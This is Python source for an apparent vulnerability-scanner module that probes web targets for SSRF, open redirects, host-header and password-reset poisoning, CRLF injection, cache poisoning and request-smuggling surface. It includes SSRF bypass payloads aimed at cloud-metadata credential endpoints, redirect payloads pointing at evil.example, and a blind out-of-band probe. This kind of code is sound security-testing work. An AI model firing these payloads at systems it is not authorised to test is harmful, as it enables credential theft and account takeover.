#!/usr/bin/env python3
"""SSRF / INFRA depth kit for the Hunter Engine.

One depth kit covering the server-side-request and edge/infrastructure family:

  * SSRF (URL-ish parameter probing with filter-bypass variants, plus blind/OOB),
  * open redirect,
  * host-header injection (including password-reset poisoning, gated),
  * CRLF / HTTP response-splitting,
  * HTTP request-smuggling *shape* detection (never a desync),
  * cache poisoning / cache deception.

Design rules honoured (see ``tools/hunter/README.md``):

  * Every request goes through ``ctx.fetch`` (SSRF-safe, mockable). The kit never
    touches the network directly, so it is fully unit-testable offline against a
    fake fetcher.
  * Detection-only by default. State-changing probes (non-safe HTTP methods, the
    active password-reset-poisoning round-trip, and the smuggling timing
    differential) run only under ``ctx.allow_write``. The kit never runs a
    destructive desync and never performs a real internal pivot -- ``ctx.fetch``
    blocks internal hops, so the kit only proves that a *parameter reaches a
    server-side fetcher* and reports that.
  * Reuses the existing tools rather than re-implementing them: ``tools.crlf_scanner``
    (CRLF payloads, the injected-header detector, and the host-header sets) and
    ``tools.oob_listener`` (blind-SSRF OOB payload / marker generation).
  * No secrets or raw bodies in findings -- only statuses, lengths, payloads,
    signature labels and short redacted notes.
  * Responses matching ``ctx.baseline`` (the SPA catch-all shell) are treated as
    noise, never as findings.

British English throughout; LF line endings; standard library + the reused tools.
"""
from __future__ import annotations

import os
import re
import sys
import uuid
from difflib import SequenceMatcher
from urllib.parse import parse_qsl, urlencode, urljoin, urlparse, urlunparse

# --- repo-root import bootstrap --------------------------------------------
# tools/hunter/kits/ssrf_infra.py -> repo root is four parents up. Adding it to
# sys.path lets the module resolve ``tools.*`` whether it is imported by the
# engine's package scan or directly by the test runner.
_REPO = os.path.dirname(
    os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
)
if _REPO not in sys.path:
    sys.path.insert(0, _REPO)

from tools.hunter.contract import (  # noqa: E402
    Finding,
    HuntContext,
    register,
    V_CONFIRMED,
    V_INCONCLUSIVE,
    V_POSSIBLE,
)
from tools.crlf_scanner import (  # noqa: E402
    CANARY,
    crlf_payloads,
    detect_injection,
    host_header_payloads,
)
from tools.oob_listener import oob_payloads  # noqa: E402


# --- parameter vocabularies -------------------------------------------------
# Names that, when present as a request parameter, commonly feed a server-side
# fetcher (SSRF) -- deliberately broad.
SSRF_PARAMS = {
    "url", "uri", "u", "link", "src", "source", "target", "dest", "destination",
    "redirect", "redirect_uri", "redirect_url", "redirecturl", "redir", "return",
    "returnurl", "return_url", "next", "continue", "goto", "out", "view", "to",
    "image", "image_url", "imageurl", "img", "imgurl", "callback", "webhook",
    "webhook_url", "proxy", "fetch", "fetchurl", "load", "remote", "forward",
    "domain", "host", "site", "feed", "file", "path", "page", "data", "reference",
    "ref", "open", "resource", "api", "endpoint", "upload", "import", "from_url",
    "fromurl", "download", "avatar", "avatar_url", "preview", "pdf", "document",
}

# Names that drive a redirect (open-redirect surface) -- a subset of the above
# plus a few redirect-specific names.
REDIRECT_PARAMS = {
    "redirect", "redirect_uri", "redirect_url", "redirecturl", "redir", "url",
    "uri", "next", "return", "returnurl", "return_url", "returnto", "return_to",
    "dest", "destination", "continue", "goto", "to", "out", "target", "forward",
    "rurl", "callback", "redirect_to", "redirectto", "checkout_url", "link",
}

# Canonical attacker / internal markers (never a real victim host).
EVIL_HOST = "evil.example"
_META_IPV4 = "169.254.169.254"
_META_GCP = "metadata.google.internal"

# Presence-only signatures that a cloud-metadata / internal service answered.
# Matched case-insensitively against a probe body; the surrounding content is
# NEVER copied into a finding (it may hold live credentials).
_META_SIGS = (
    "latest/meta-data", "iam/security-credentials", "security-credentials",
    "ami-id", "instance-id", "instance-identity", "availability-zone",
    "computemetadata", "metadata.google", "compute/v1", "accesskeyid",
    "x-aws-ec2-metadata-token",
)

# Matches EVIL_HOST appearing as the host of an absolute / scheme-relative URL
# (so a bare mention in a query string is not mistaken for a reflected host).
_EVIL_URL_RE = re.compile(
    r"(?:https?:)?//(?:[^/@\s\"'<>]*@)?" + re.escape(EVIL_HOST) + r"\b", re.I
)

# Unkeyed headers worth testing for cache-poisoning reflection.
_UNKEYED_HEADERS = (
    "X-Forwarded-Host", "X-Host", "X-Forwarded-Server", "X-Forwarded-Scheme",
    "X-Original-URL", "X-Rewrite-URL",
)

# Proxy / CDN response markers that reveal a front-end/back-end chain (the
# precondition for request smuggling). ``Server`` alone is deliberately excluded
# -- almost every host sets it, so it is not evidence of a multi-hop chain.
_PROXY_HEADERS = (
    "Via", "X-Served-By", "X-Cache", "CF-Ray", "X-Varnish", "X-Proxy",
    "X-Forwarded-Server", "X-Amz-Cf-Id", "Fastly-Debug-Digest", "X-Cache-Hits",
)

_SAFE_METHODS = {"GET", "HEAD", "OPTIONS"}


def ssrf_bypass_payloads():
    """Return ``(technique, payload)`` pairs that point a parameter at internal
    or cloud-metadata targets through a range of filter bypasses.

    Pure function. Covers the AWS/GCP metadata endpoints, decimal/octal/hex
    IPv4, IPv6 loopback and IPv4-mapped IPv6, ``0.0.0.0``, ``localhost``, the
    ``@``-userinfo confusion, a DNS-rebind-shaped host and a redirect-chain shape.
    """
    return [
        ("cloud-metadata-aws", f"http://{_META_IPV4}/latest/meta-data/"),
        ("cloud-metadata-aws-creds",
         f"http://{_META_IPV4}/latest/meta-data/iam/security-credentials/"),
        ("cloud-metadata-gcp", f"http://{_META_GCP}/computeMetadata/v1/"),
        ("decimal-ip", "http://2852039166/latest/meta-data/"),
        ("octal-ip", "http://0251.0376.0251.0376/latest/meta-data/"),
        ("hex-ip", "http://0xA9FEA9FE/latest/meta-data/"),
        ("ipv6-loopback", "http://[::1]/"),
        ("ipv6-mapped-metadata", "http://[::ffff:169.254.169.254]/"),
        ("zero-ip", "http://0.0.0.0/"),
        ("localhost", "http://localhost/"),
        ("at-confusion", f"http://allowed.example@{_META_IPV4}/latest/meta-data/"),
        ("dns-rebind-shape", f"http://{_META_IPV4}.1u.ms/"),
        ("redirect-chain", f"http://allowed.example/redirect?to=http://{_META_IPV4}/"),
    ]


def open_redirect_payloads(target_host: str = ""):
    """Return ``(technique, payload)`` pairs for open-redirect probing."""
    return [
        ("absolute-https", f"https://{EVIL_HOST}/"),
        ("absolute-http", f"http://{EVIL_HOST}/"),
        ("scheme-relative", f"//{EVIL_HOST}/"),
        ("backslash", f"/\\{EVIL_HOST}/"),
        ("double-backslash", f"\\/\\/{EVIL_HOST}/"),
        ("at-userinfo", f"https://{target_host or 'target'}@{EVIL_HOST}/"),
    ]


class SsrfInfraKit:
    """Depth kit ``ssrf-infra``."""

    name = "ssrf-infra"
    classes = (
        "ssrf", "request-smuggling", "cache-poisoning", "open-redirect",
        "host-header", "crlf",
    )

    # Bound the per-technique work so a large surface cannot explode request count.
    MAX_EP = 40

    # ------------------------------------------------------------------ gates
    def applicable(self, ctx: HuntContext) -> bool:
        """Applicable whenever there is any HTTP surface to reason over."""
        return bool(ctx.endpoints) or bool(ctx.base_url)

    def run(self, ctx: HuntContext) -> list:
        if ctx.fetch is None:
            return []
        endpoints = [e for e in (ctx.endpoints or []) if isinstance(e, dict)]
        findings: list = []
        for stage in (
            self._ssrf, self._open_redirect, self._crlf,
            self._host_header, self._cache, self._smuggling,
        ):
            try:
                findings.extend(stage(ctx, endpoints))
            except Exception as exc:  # one broken technique must not abort the run
                ctx.notes.append(f"ssrf-infra: {stage.__name__} errored: {exc!r}")
        return findings

    # --------------------------------------------------------------- helpers
    def _abs(self, ctx: HuntContext, url: str) -> str:
        if not url:
            return url
        if urlparse(url).scheme:
            return url
        return urljoin(ctx.base_url or "", url)

    def _in_scope(self, ctx: HuntContext, url: str) -> bool:
        host = urlparse(url).hostname or ""
        return (not host) or ctx.in_scope(host)

    def _can_send(self, ctx: HuntContext, method: str) -> bool:
        """Safe (read) methods always; anything state-changing only under write."""
        return (method or "GET").upper() in _SAFE_METHODS or bool(ctx.allow_write)

    def _is_noise(self, ctx: HuntContext, resp) -> bool:
        if resp is None:
            return True
        base = ctx.baseline
        try:
            if base is not None and base.is_catchall(resp.status, resp.body):
                return True
        except Exception:
            pass
        return False

    @staticmethod
    def _merge(a, b):
        out = dict(a or {})
        out.update(b or {})
        return out or None

    @staticmethod
    def _endpoint_params(ep: dict) -> set:
        names = set()
        try:
            for k, _ in parse_qsl(urlparse(ep.get("url", "")).query,
                                  keep_blank_values=True):
                names.add(k)
        except Exception:
            pass
        extra = ep.get("params")
        if isinstance(extra, dict):
            names.update(str(k) for k in extra)
        elif isinstance(extra, (list, tuple)):
            for p in extra:
                if isinstance(p, str):
                    names.add(p)
                elif isinstance(p, dict) and p.get("name"):
                    names.add(str(p["name"]))
        return names

    @staticmethod
    def _set_param(url: str, name: str, value: str) -> str:
        p = urlparse(url)
        pairs = [(k, v) for k, v in parse_qsl(p.query, keep_blank_values=True)
                 if k != name]
        pairs.append((name, value))
        q = urlencode(pairs, doseq=True, safe="/:@[]")
        return urlunparse((p.scheme, p.netloc, p.path, p.params, q, p.fragment))

    @staticmethod
    def _inject_path(url: str, payload: str) -> str:
        """Append a CRLF payload onto the path, reusing the scanner's vector."""
        try:
            from tools.crlf_scanner import _inject_into_path
            return _inject_into_path(url, payload)
        except Exception:
            p = urlparse(url)
            new_path = (p.path or "/").rstrip("/") + "/" + payload
            return urlunparse((p.scheme, p.netloc, new_path, p.params, p.query, ""))

    @staticmethod
    def _meta_signature(body) -> str:
        low = (body or "").lower()
        for sig in _META_SIGS:
            if sig in low:
                return sig
        return ""

    @staticmethod
    def _diff(control, probe):
        """Meaningful response difference between a control and a probe."""
        if probe is None or control is None:
            return False, ""
        reasons = []
        if control.status != probe.status:
            reasons.append(f"status {control.status}->{probe.status}")
        lc, lp = len(control.body or ""), len(probe.body or "")
        if max(lc, lp) and abs(lp - lc) > 32 and abs(lp - lc) / max(lc, 1) > 0.25:
            reasons.append(f"len {lc}->{lp}")
        return (bool(reasons), "; ".join(reasons))

    @staticmethod
    def _redirect_host(loc: str) -> str:
        """Host a browser would navigate to for ``loc`` (empty for same-origin
        path-only redirects). Normalises backslash tricks and strips userinfo."""
        if not loc:
            return ""
        s = loc.strip().replace("\\", "/")
        m = re.match(r"^[a-zA-Z][a-zA-Z0-9+.\-]*:", s)
        if m:
            s = s[m.end():]
        if s.startswith("//"):
            s = s[2:]
        elif s.startswith("/"):
            return ""  # path-only -> same origin, not a host redirect
        s = re.split(r"[/?#]", s, maxsplit=1)[0]
        if "@" in s:
            s = s.split("@")[-1]
        s = s.split(":")[0]
        return s.lower().rstrip(".")

    def _location_is_evil(self, loc: str) -> bool:
        host = self._redirect_host(loc)
        return host == EVIL_HOST or host.endswith("." + EVIL_HOST)

    @staticmethod
    def _body_redirects_to_evil(body) -> bool:
        if not body:
            return False
        return bool(re.search(
            r"(?:url\s*=|location(?:\.href)?\s*=\s*['\"]?)\s*(?:https?:)?//"
            + re.escape(EVIL_HOST), body, re.I))

    @staticmethod
    def _reflects_evil(text) -> bool:
        return bool(text) and bool(_EVIL_URL_RE.search(text))

    @staticmethod
    def _cacheable(resp) -> bool:
        cc = (resp.header("Cache-Control") or "").lower()
        if "no-store" in cc or "private" in cc:
            return False
        if "public" in cc or "s-maxage" in cc or "max-age" in cc:
            return True
        for h in ("Age", "X-Cache", "CF-Cache-Status", "X-Cache-Hits", "Age:"):
            if resp.header(h) is not None:
                return True
        return False

    # ------------------------------------------------------------------- SSRF
    def _ssrf(self, ctx: HuntContext, endpoints) -> list:
        fetch = ctx.fetch
        out, seen = [], set()
        for ep in endpoints[: self.MAX_EP]:
            method = (ep.get("method") or "GET").upper()
            url = self._abs(ctx, ep.get("url", ""))
            if not url or not self._in_scope(ctx, url) or not self._can_send(ctx, method):
                continue
            params = [p for p in self._endpoint_params(ep) if p.lower() in SSRF_PARAMS]
            for name in params:
                key = (urlparse(url).path, name)
                if key in seen:
                    continue
                seen.add(key)
                out.extend(self._ssrf_param(ctx, fetch, method, url, name))
        return out

    def _ssrf_param(self, ctx, fetch, method, url, name) -> list:
        auth = ctx.account_a.headers or None
        control = fetch(method, self._set_param(
            url, name, f"http://ssrf-control-{uuid.uuid4().hex[:8]}.example/"), headers=auth)
        if self._is_noise(ctx, control):
            control = None
        responded = control is not None
        hits, sig, sig_tech = [], "", ""
        for tech, payload in ssrf_bypass_payloads():
            probe = fetch(method, self._set_param(url, name, payload), headers=auth)
            if self._is_noise(ctx, probe):
                continue
            responded = True
            found = self._meta_signature(probe.body)
            if found:
                sig, sig_tech = found, tech
                break  # a metadata signature is conclusive -- stop probing
            diffed, reason = self._diff(control, probe)
            if diffed:
                hits.append((tech, reason, probe.status, len(probe.body or "")))

        if sig:
            return [Finding(
                cls="ssrf",
                title=f"SSRF reaches cloud metadata via parameter '{name}'",
                severity="critical", confidence="confirmed", axis="ssrf",
                technique=sig_tech, method=method, url=url,
                evidence={"param": name, "signature": sig,
                          "bypasses_hit": [h[0] for h in hits],
                          "note": "metadata-service signature seen in fetched "
                                  "response (body withheld -- may contain creds)"},
                verdict=V_CONFIRMED,
                repro=[f"Set '{name}' to a cloud-metadata URL (e.g. the link-local "
                       f"metadata IP); the server fetches it and returns metadata."],
                kill_reasons=[],
                chain_hints=["ssrf->cloud-metadata->creds", "ssrf->internal-services"],
            )]
        if hits:
            return [Finding(
                cls="ssrf",
                title=f"SSRF: parameter '{name}' reaches a server-side fetcher",
                severity="high", confidence="firm", axis="ssrf",
                technique=hits[0][0], method=method, url=url,
                evidence={"param": name, "bypasses_hit": [h[0] for h in hits],
                          "diff": hits[0][1],
                          "probe_status": hits[0][2], "probe_len": hits[0][3],
                          "note": "internal-pointed value changed the response "
                                  "versus an external control -- the value is fetched "
                                  "server-side (no internal pivot performed)"},
                verdict=V_POSSIBLE,
                repro=[f"Point '{name}' at an internal/metadata host; the response "
                       f"differs from an external control, showing server-side fetch."],
                kill_reasons=["reachability shown by response-diff only -- confirm "
                              "fetched content or confirm out-of-band"],
                chain_hints=["ssrf->cloud-metadata->creds", "ssrf->internal-services",
                             "ssrf->redirect-filter-bypass"],
            )]
        if responded:
            # Blind: no in-band signal. Emit an OOB payload/marker and flag it.
            items = oob_payloads("oob.example", ["ssrf"]).get("ssrf", [])
            marker = items[0]["marker"] if items else ""
            if items:
                # Fire the blind payload once so a running OOB listener could catch it.
                fetch(method, self._set_param(url, name, items[0]["payload"]), headers=auth)
            return [Finding(
                cls="ssrf",
                title=f"Possible blind SSRF in parameter '{name}' (needs OOB)",
                severity="medium", confidence="tentative", axis="ssrf",
                technique="blind-oob", method=method, url=url,
                evidence={"param": name, "oob_marker": marker, "needs_oob": True,
                          "note": "engine should substitute its interactsh domain "
                                  "and correlate an inbound interaction"},
                verdict=V_INCONCLUSIVE,
                repro=[f"Set '{name}' to an OOB URL (marker {marker}) and confirm via "
                       f"an inbound DNS/HTTP interaction."],
                kill_reasons=["blind -- no in-band diff; needs OOB confirmation "
                              "(marker emitted)"],
                chain_hints=["ssrf->cloud-metadata->creds"],
            )]
        return []

    # --------------------------------------------------------- open redirect
    def _open_redirect(self, ctx: HuntContext, endpoints) -> list:
        fetch = ctx.fetch
        out, seen = [], set()
        tgt_host = urlparse(ctx.base_url or "").hostname or ""
        for ep in endpoints[: self.MAX_EP]:
            method = (ep.get("method") or "GET").upper()
            url = self._abs(ctx, ep.get("url", ""))
            if not url or not self._in_scope(ctx, url) or not self._can_send(ctx, method):
                continue
            for name in [p for p in self._endpoint_params(ep)
                         if p.lower() in REDIRECT_PARAMS]:
                key = (urlparse(url).path, name)
                if key in seen:
                    continue
                seen.add(key)
                hit = None
                for tech, payload in open_redirect_payloads(tgt_host):
                    probe = fetch(method, self._set_param(url, name, payload),
                                  headers=ctx.account_a.headers or None)
                    if self._is_noise(ctx, probe):
                        continue
                    loc = probe.header("Location") or ""
                    if self._location_is_evil(loc):
                        hit = (tech, payload, probe.status, "Location")
                        break
                    if self._body_redirects_to_evil(probe.body):
                        hit = (tech, payload, probe.status, "body")
                        break
                if hit:
                    tech, payload, status, where = hit
                    out.append(Finding(
                        cls="open-redirect",
                        title=f"Open redirect via parameter '{name}'",
                        severity="medium", confidence="confirmed", axis="redirect",
                        technique=tech, method=method, url=url,
                        evidence={"param": name, "payload": payload, "status": status,
                                  "reflected_in": where, "attacker_host": EVIL_HOST},
                        verdict=V_CONFIRMED,
                        repro=[f"Set '{name}' to {payload}; the response redirects to "
                               f"{EVIL_HOST} ({where})."],
                        kill_reasons=[],
                        chain_hints=["open-redirect->oauth-token-theft",
                                     "open-redirect->phishing",
                                     "open-redirect->ssrf-filter-bypass"],
                    ))
        return out

    # ------------------------------------------------------------------- CRLF
    def _crlf(self, ctx: HuntContext, endpoints) -> list:
        fetch = ctx.fetch
        out, seen = [], set()
        targets = []
        if ctx.base_url:
            targets.append(self._abs(ctx, ctx.base_url))
        targets += [self._abs(ctx, ep.get("url", "")) for ep in endpoints[: self.MAX_EP]]
        for url in targets:
            if not url or not self._in_scope(ctx, url):
                continue
            key = (urlparse(url).hostname, urlparse(url).path)
            if key in seen:
                continue
            seen.add(key)
            for payload in crlf_payloads():
                # CRLF is probed as a safe GET read regardless of the endpoint verb.
                probe = fetch("GET", self._inject_path(url, payload),
                              headers=ctx.account_a.headers or None)
                if probe is None:
                    continue
                if detect_injection(probe.headers or {}):
                    out.append(Finding(
                        cls="crlf",
                        title="CRLF response-splitting (Set-Cookie injection)",
                        severity="high", confidence="confirmed", axis="crlf",
                        technique="response-splitting", method="GET", url=url,
                        evidence={"payload": payload,
                                  "injected_header": f"Set-Cookie:{CANARY}=1",
                                  "status": probe.status},
                        verdict=V_CONFIRMED,
                        repro=[f"Request {self._inject_path(url, payload)}; the canary "
                               f"Set-Cookie ({CANARY}=1) is reflected into the response "
                               f"headers."],
                        kill_reasons=[],
                        chain_hints=["crlf->set-cookie-session-fixation",
                                     "crlf->cache-poisoning",
                                     "crlf->xss-via-injected-body"],
                    ))
                    break  # one CRLF proof per target is enough
        return out

    # ----------------------------------------------------------- host header
    def _host_header(self, ctx: HuntContext, endpoints) -> list:
        fetch = ctx.fetch
        out, seen = [], set()
        targets = []
        if ctx.base_url:
            targets.append(("GET", self._abs(ctx, ctx.base_url)))
        targets += [((ep.get("method") or "GET").upper(), self._abs(ctx, ep.get("url", "")))
                    for ep in endpoints[: self.MAX_EP]]
        for method, url in targets:
            if not url or method != "GET" or not self._in_scope(ctx, url):
                continue  # reflection probe is a read; keep it to GET targets
            key = (urlparse(url).hostname, urlparse(url).path)
            if key in seen:
                continue
            seen.add(key)
            host = urlparse(url).hostname or "target.example"
            for hset in host_header_payloads(host, EVIL_HOST):
                probe = fetch(method, url, headers=self._merge(ctx.account_a.headers, hset))
                if self._is_noise(ctx, probe):
                    continue
                loc = probe.header("Location") or ""
                where = ("Location" if self._reflects_evil(loc)
                         else "body-link" if self._reflects_evil(probe.body) else "")
                if where:
                    tech = ("x-forwarded-host" if "X-Forwarded-Host" in hset
                            else "forwarded" if "Forwarded" in hset else "host-override")
                    out.append(Finding(
                        cls="host-header",
                        title=f"Host-header injection reflected into {where}",
                        severity="medium", confidence="firm", axis="host-header",
                        technique=tech, method=method, url=url,
                        evidence={"headers_sent": dict(hset), "reflected_in": where,
                                  "attacker_host": EVIL_HOST,
                                  "cacheable": self._cacheable(probe)},
                        verdict=V_POSSIBLE,
                        repro=[f"Send {list(hset)} (attacker host {EVIL_HOST}); it is "
                               f"reflected into the {where}."],
                        kill_reasons=["password-reset poisoning not actively confirmed "
                                      "(requires allow_write)"],
                        chain_hints=["host-header->password-reset-poisoning",
                                     "host-header->cache-poisoning",
                                     "host-header->web-cache-deception"],
                    ))
                    break  # one reflection proof per target
        if ctx.allow_write:
            out.extend(self._reset_poisoning(ctx, endpoints))
        return out

    def _reset_poisoning(self, ctx: HuntContext, endpoints) -> list:
        """Active password-reset poisoning probe -- gated behind allow_write.

        Sends one host-spoofed request (the endpoint's own verb, empty body) to
        each reset-like endpoint and reports a reflected attacker host. Never
        loops/floods; the full token round-trip still needs manual confirmation.
        """
        fetch = ctx.fetch
        out = []
        for ep in endpoints[: self.MAX_EP]:
            url = self._abs(ctx, ep.get("url", ""))
            method = (ep.get("method") or "GET").upper()
            if not url or not self._in_scope(ctx, url):
                continue
            if not re.search(r"(reset|forgot|recover|password)", urlparse(url).path, re.I):
                continue
            hset = {"Host": urlparse(url).hostname or "target.example",
                    "X-Forwarded-Host": EVIL_HOST}
            probe = fetch(method, url, headers=self._merge(ctx.account_a.headers, hset),
                          body={})
            if self._is_noise(ctx, probe):
                continue
            if self._reflects_evil(probe.header("Location") or "") or \
                    self._reflects_evil(probe.body):
                out.append(Finding(
                    cls="host-header",
                    title="Password-reset poisoning: attacker host reflected",
                    severity="high", confidence="firm", axis="host-header",
                    technique="password-reset-poisoning", method=method, url=url,
                    evidence={"headers_sent": dict(hset), "attacker_host": EVIL_HOST,
                              "note": "reset link would point at the attacker host"},
                    verdict=V_POSSIBLE,
                    repro=[f"Trigger a reset at {url} with X-Forwarded-Host {EVIL_HOST}; "
                           f"the attacker host appears in the reset link."],
                    kill_reasons=["confirm by receiving the reset mail / observing the "
                                  "token delivered to the attacker host"],
                    chain_hints=["host-header->password-reset-poisoning->account-takeover"],
                ))
        return out

    # ----------------------------------------------------- cache poison/decept
    def _cache(self, ctx: HuntContext, endpoints) -> list:
        out = []
        out.extend(self._cache_unkeyed(ctx, endpoints))
        out.extend(self._cache_deception(ctx, endpoints))
        return out

    def _cache_unkeyed(self, ctx: HuntContext, endpoints) -> list:
        fetch = ctx.fetch
        out, seen = [], set()
        targets = []
        if ctx.base_url:
            targets.append(self._abs(ctx, ctx.base_url))
        targets += [self._abs(ctx, ep.get("url", ""))
                    for ep in endpoints[: self.MAX_EP]
                    if (ep.get("method") or "GET").upper() == "GET"]
        for url in targets:
            if not url or not self._in_scope(ctx, url):
                continue
            key = (urlparse(url).hostname, urlparse(url).path)
            if key in seen:
                continue
            seen.add(key)
            for header in _UNKEYED_HEADERS:
                probe = fetch("GET", url, headers=self._merge(
                    ctx.account_a.headers, {header: EVIL_HOST}))
                if self._is_noise(ctx, probe):
                    continue
                # A cacheable response that reflects an unkeyed header is poisonable.
                if self._reflects_evil(probe.body) and self._cacheable(probe):
                    out.append(Finding(
                        cls="cache-poisoning",
                        title=f"Cache poisoning via unkeyed header '{header}'",
                        severity="high", confidence="firm", axis="cache",
                        technique="unkeyed-header-reflection", method="GET", url=url,
                        evidence={"unkeyed_header": header, "attacker_host": EVIL_HOST,
                                  "cacheable": True,
                                  "cache_control": probe.header("Cache-Control") or ""},
                        verdict=V_POSSIBLE,
                        repro=[f"Send '{header}: {EVIL_HOST}'; it is reflected into a "
                               f"cacheable response and would be served to other users."],
                        kill_reasons=["confirm the poisoned entry is cached and served "
                                      "to a second request without the header"],
                        chain_hints=["cache-poisoning->stored-xss",
                                     "cache-poisoning->redirect-hijack"],
                    ))
                    break
        return out

    def _cache_deception(self, ctx: HuntContext, endpoints) -> list:
        fetch = ctx.fetch
        out, seen = [], set()
        auth = ctx.account_a.headers or None
        for ep in endpoints[: self.MAX_EP]:
            method = (ep.get("method") or "GET").upper()
            url = self._abs(ctx, ep.get("url", ""))
            if method != "GET" or not url or not self._in_scope(ctx, url):
                continue
            path = urlparse(url).path
            # Only dynamic-looking paths (no existing file extension) are candidates.
            if not path or path == "/" or re.search(r"\.[a-z0-9]{2,5}$", path, re.I):
                continue
            if path in seen:
                continue
            seen.add(path)
            base = fetch(method, url, headers=auth)
            if self._is_noise(ctx, base) or base.status != 200:
                continue
            deceive = urlunparse(urlparse(url)._replace(
                path=path.rstrip("/") + "/cache-deception.css"))
            probe = fetch("GET", deceive, headers=auth)
            if self._is_noise(ctx, probe) or probe.status != 200:
                continue
            if self._cacheable(probe) and self._similar(base.body, probe.body):
                out.append(Finding(
                    cls="cache-poisoning",
                    title="Web cache deception: dynamic page served under a static path",
                    severity="high", confidence="firm", axis="cache",
                    technique="static-extension-path-confusion", method="GET", url=url,
                    evidence={"deception_url": deceive,
                              "cache_control": probe.header("Cache-Control") or "",
                              "note": "authenticated/dynamic content returned under a "
                                      "cacheable .css path"},
                    verdict=V_POSSIBLE,
                    repro=[f"Request {deceive}; the dynamic page is returned with cache "
                           f"headers, so a cache may store a victim's private page."],
                    kill_reasons=["confirm a shared cache stores and serves the private "
                                  "response to another user"],
                    chain_hints=["cache-deception->session-data-leak",
                                 "cache-deception->account-takeover"],
                ))
        return out

    @staticmethod
    def _similar(a, b) -> bool:
        a, b = (a or "")[:6000], (b or "")[:6000]
        if not a or not b:
            return False
        if abs(len(a) - len(b)) / max(len(a), 1) > 0.25:
            return False
        return SequenceMatcher(None, a, b).ratio() >= 0.9

    # ------------------------------------------------------ request smuggling
    def _smuggling(self, ctx: HuntContext, endpoints) -> list:
        """CL.TE / TE.CL *shape* detection only -- never a desync.

        ``ctx.fetch`` normalises framing, so a byte-level desync is neither
        possible nor attempted here. We reason about the surface (is there a
        front-end/back-end chain?) and, only under allow_write, take one safe
        timing/response differential from a lone Transfer-Encoding header.
        """
        fetch = ctx.fetch
        url = self._abs(ctx, ctx.base_url or (endpoints[0].get("url", "") if endpoints else ""))
        if not url or not self._in_scope(ctx, url):
            return []
        base = fetch("GET", url, headers=ctx.account_a.headers or None)
        if self._is_noise(ctx, base):
            return []
        chain = [h for h in _PROXY_HEADERS if base.header(h)]
        if not chain:
            return []  # no multi-hop chain -> no smuggling surface to report
        evidence = {"proxy_indicators": chain,
                    "note": "CL.TE/TE.CL framing differential NOT sent -- shape/surface "
                            "reasoning only; no desync performed"}
        technique, verdict = "surface-proxy-chain", V_INCONCLUSIVE
        if ctx.allow_write:
            te = fetch("GET", url, headers=self._merge(
                ctx.account_a.headers, {"Transfer-Encoding": "chunked"}))
            if not self._is_noise(ctx, te):
                if te.status != base.status or \
                        abs((te.elapsed_ms or 0) - (base.elapsed_ms or 0)) > 4000:
                    evidence["differential"] = (
                        f"lone Transfer-Encoding changed behaviour "
                        f"(status {base.status}->{te.status}, "
                        f"{base.elapsed_ms}->{te.elapsed_ms} ms)")
                    technique, verdict = "te-header-differential", V_POSSIBLE
        return [Finding(
            cls="request-smuggling",
            title="Request-smuggling surface (front-end/back-end chain present)",
            severity="low", confidence="tentative", axis="smuggling",
            technique=technique, method="GET", url=url,
            evidence=evidence, verdict=verdict,
            repro=["Observe the proxy chain; CL.TE/TE.CL confirmation requires manual "
                   "byte-level framing tests (not automated -- safety)."],
            kill_reasons=["shape only -- manual raw-socket CL.TE/TE.CL desync required "
                          "to confirm; not performed (safety)"],
            chain_hints=["request-smuggling->cache-poisoning",
                         "request-smuggling->auth-bypass",
                         "request-smuggling->credential-theft"],
        )]


# Self-register so the engine's directory scan discovers this kit on import.
register(SsrfInfraKit())
